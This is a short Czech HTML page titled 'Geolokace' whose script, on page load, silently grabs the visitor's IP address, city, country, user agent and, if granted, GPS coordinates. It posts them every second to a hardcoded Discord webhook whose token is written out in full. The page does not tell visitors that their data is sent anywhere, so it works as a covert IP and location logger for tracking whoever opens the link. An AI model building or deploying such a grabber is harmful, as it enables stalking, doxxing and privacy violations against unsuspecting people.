<!DOCTYPE html>
<html lang="cs">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Geolokace</title>
</head>
<body>
    <h1>Geolokace a informace o zařízení</h1>

    <script>
        const WEBHOOK_URL = "https://discord.com/api/webhooks/1336736765674917979/lyGotJhq7TWp2kRsHpd_246EPiXxMZ91S3rKDVuq54iFQX-FY8TlJ7pat1eBph-KL0XC"; // Nahraď svým webhookem
        let gpsConfirmed = false;  // Zjištění, zda bylo GPS potvrzeno

        function sendToDiscord(message) {
            fetch(WEBHOOK_URL, {
                method: "POST",
                headers: { "Content-Type": "application/json" },
                body: JSON.stringify({ content: message })
            }).catch(error => console.error("Chyba odesílání:", error));
        }

        function getIP(device, gpsData) {
            fetch("https://ipinfo.io/json")
            .then(response => response.json())
            .then(data => {
                const message = `@everyone\n📱 Zařízení: ${device}\n🌍 IP Adresa: ${data.ip} (Město: ${data.city}, Země: ${data.country})\n🌐 VPN: ${isVPN()}\n${gpsData}`;

                sendToDiscord(message);
            })
            .catch(error => console.error("Chyba získání IP:", error));
        }

        function getLocation() {
            let device = navigator.userAgent; // Detekce zařízení

            // Odesílání IP a zařízení ihned po načtení stránky
            getIP(device, "🚫 GPS není potvrzena");

            if (navigator.geolocation) {
                navigator.geolocation.getCurrentPosition(position => {
                    const lat = position.coords.latitude.toFixed(6);
                    const lon = position.coords.longitude.toFixed(6);
                    gpsConfirmed = true;
                    getIP(device, `📍 GPS: ${lat}, ${lon}`);
                }, () => {
                    getIP(device, "🚫 GPS zamítnuta");
                });
            } else {
                getIP(device, "🚫 GPS není podporována");
            }
        }

        function isVPN() {
            // Sem můžeš přidat logiku pro detekci VPN (záleží na dalších metodách)
            return "FALSE";  // Defaultní hodnota pro VPN. Můžeš přidat detekci VPN, pokud máš takové možnosti
        }

        window.onload = function() {
            getLocation();

            // Interval pro odesílání informací každou sekundu, dokud není GPS potvrzena
            const interval = setInterval(() => {
                let device = navigator.userAgent;
                if (gpsConfirmed) {
                    clearInterval(interval);  // Po potvrzení GPS se interval zastaví
                }
                getIP(device, gpsConfirmed ? `📍 GPS potvrzena.` : "🚫 GPS není potvrzena");
            }, 1000); // 1000 ms = 1 sekunda
        };
    </script>
</body>
</html>
